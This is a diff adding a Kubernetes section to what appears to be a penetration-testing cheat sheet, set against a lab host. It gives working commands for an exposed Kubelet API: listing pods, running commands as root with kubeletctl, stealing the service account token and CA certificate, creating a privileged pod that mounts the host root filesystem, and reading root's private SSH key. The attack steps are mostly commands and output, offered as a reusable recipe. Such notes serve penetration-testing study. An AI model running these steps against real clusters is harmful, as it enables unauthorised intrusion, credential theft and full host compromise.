@@ -262,3 +262,173 @@ ubuntu                               20.04               20fffa419e3a   2 days a
 ```shell
 docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
 ```
+
+### Kubernetes
+
+
+| Service             | TCP Ports       |
+|---------------------|-----------------|
+| etcd                | 2379, 2380      |
+| API server          | 6443            |
+| Scheduler           | 10251           |
+| Controller Manager  | 10252           |
+| Kubelet API         | 10250           |
+| Read-Only Kubelet API | 10255         |
+
+
+
+#### **Extracting Pods**
+- **Kubelet API**
+```shell
+$ curl https://10.129.10.11:10250/pods -k | jq .
+
+...SNIP...
+{
+  "kind": "PodList",
+  "apiVersion": "v1",
+  "metadata": {},
+  "items": [
+    {
+      "metadata": {
+        "name": "nginx",
+        "namespace": "default",
+        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
+        "resourceVersion": "491",
+        "creationTimestamp": "2023-07-04T10:42:02Z",
+        "annotations": {
+          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
+          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
+          "kubernetes.io/config.source": "api"
+        },
+```
+
+- **Kubeletctl**
+```shell
+$ kubeletctl -i --server 10.129.10.11 pods
+
+┌────────────────────────────────────────────────────────────────────────────────┐
+│                                Pods from Kubelet                               │
+├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
+│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 2 │ nginx                              │ default     │ nginx                   │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
+│   │                                    │             │                         │
+├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
+```
+
+#### Available Commands
+
+- **Kubeletctl**
+  
+```shell
+$ kubeletctl -i --server 10.129.10.11 scan rce
+
+┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                   Node with pods vulnerable to RCE                                  │
+├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
+│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│   │              │                                    │             │                         │ RUN │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
+├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
+```
+
+#### Executing Commands
+
+- **Kubeletctl**
+
+```shell
+$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
+
+uid=0(root) gid=0(root) groups=0(root)
+```
+current user executing the id command inside the container has root privileges. which could potentially lead to privilege escalation vulnerabilities. 
+
+
+If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.
+
+#### Extracting Tokens
+
+```shell
+$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
+```
+
+#### Extracting Certificates
+
+```shell
+$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
+```
+
+Now that we have both the token and certificate, we can check the access rights in the Kubernetes cluster.
+
+we can inquire of K8s whether we have permission to perform different actions on various resources.
+
+#### List Privileges
+```
+$ export token=`cat k8.token`
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
+
+
+Resources										Non-Resource URLs	Resource Names	Verbs 
+selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
+selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
+pods											    []					[]				[get create list]
+```
+
+we can get, create, and list pods which are the resources representing the running container in the cluster. 
+
+From here on, we can create a YAML file that we can use to create a new container and mount the entire root filesystem from the host system into this container's /root directory. From there on, we could access the host systems files and directories.
+
+#### Pod YAML
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc
+  namespace: default
+spec:
+  containers:
+  - name: privesc
+    image: nginx:1.14.2
+    volumeMounts:
+    - mountPath: /root
+      name: mount-root-into-mnt
+  volumes:
+  - name: mount-root-into-mnt
+    hostPath:
+       path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+
+```
+
+#### Creating a new Pod
+```shell
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
+
+pod/privesc created
+
+
+$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
+
+NAME	READY	STATUS	RESTARTS	AGE
+nginx	1/1		Running	0			23m
+privesc	1/1		Running	0			12s
+```
+
+#### Extracting Root's SSH Key
+```shell
+$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+```
